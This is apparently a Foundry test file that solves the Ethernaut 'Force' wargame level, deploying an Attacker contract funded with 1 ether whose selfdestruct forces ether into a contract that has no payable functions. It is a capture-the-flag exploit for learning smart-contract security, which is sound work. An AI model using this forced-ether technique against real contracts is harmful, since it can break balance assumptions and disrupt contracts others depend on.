// SPDX-License-Identifier: Unlicense
pragma solidity >=0.6.0;
pragma experimental ABIEncoderV2;

import "./utils/BaseTest.sol";
import "src/levels/Force.sol";
import "src/levels/ForceFactory.sol";

contract TestForce is BaseTest {
    Force private level;

    constructor() public {
        // SETUP LEVEL FACTORY
        levelFactory = new ForceFactory();
    }

    function setUp() public override {
        // Call the BaseTest setUp() function that will also create testsing accounts
        super.setUp();
    }

    function testRunLevel() public {
        runLevel();
    }

    function setupLevel() internal override {
        /**
         * CODE YOUR SETUP HERE
         */
        levelAddress = payable(this.createLevelInstance(true));
        level = Force(levelAddress);

        // Check that the contract is correctly setup
        assertEq(address(level).balance, 0);
    }

    function exploitLevel() internal override {
        /**
         * CODE YOUR EXPLOIT HERE
         */

        // Goal here is to send some ether to the contract
        // Since there is no payable functions, no receive() and fallback(), we need to selfdestruct some other contract that has ETH

        vm.startPrank(player, player);

        // Deploy contract and send some eth to it
        Attacker attacker = new Attacker{value: 1 ether}(payable(address(level)));

        // Selfdestruct the attacker contract to send the ETH to the level contract
        attacker.attack();

        vm.stopPrank();
    }
}

contract Attacker {
    address payable private level;

    constructor(address payable _level) public payable {
        require(msg.value > 0, "Attacker: No ETH sent");
        level = _level;
    }

    function attack() public {
        selfdestruct(level);
    }
}
